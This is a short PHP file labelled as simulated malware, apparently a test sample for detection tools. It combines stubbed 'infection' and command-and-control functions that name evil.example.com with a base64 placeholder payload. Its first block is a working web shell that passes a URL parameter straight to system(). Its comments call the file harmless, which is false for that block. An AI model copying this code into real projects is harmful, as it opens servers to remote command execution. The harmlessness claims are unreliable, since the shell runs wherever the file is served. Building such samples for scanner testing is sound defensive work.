<?php
// Simulated malicious PHP code for test purposes only
// This is not actually harmful but represents what malware might look like

// Fake backdoor/webshell functionality
if (isset($_GET['cmd'])) {
    echo "<pre>";
    system($_GET['cmd']); // This would execute system commands if enabled
    echo "</pre>";
}

// Fake data exfiltration
if (isset($_POST['data'])) {
    $data = $_POST['data'];
    file_put_contents('stolen_data.txt', $data, FILE_APPEND); // Would collect and store data
    echo "Data received";
}

// Fake infection routine
function infect_files($dir) {
    // This would append malicious code to other PHP files
    // Just a simulation - doesn't actually do anything harmful
    return "Would have infected files in: " . $dir;
}

// Fake encrypted payload
$encrypted_payload = "VGhpcyBpcyBhIHNpbXVsYXRlZCBlbmNyeXB0ZWQgcGF5bG9hZCBmb3IgdGVzdGluZyBwdXJwb3Nlcw==";
$key = "malware_test_key";

// Fake C&C communication
function connect_to_cc() {
    // This would connect to a command & control server
    // Just a simulation
    return "Would have connected to: evil.example.com:8080";
}

echo "<!-- PHP Backdoor Active -->";
?> 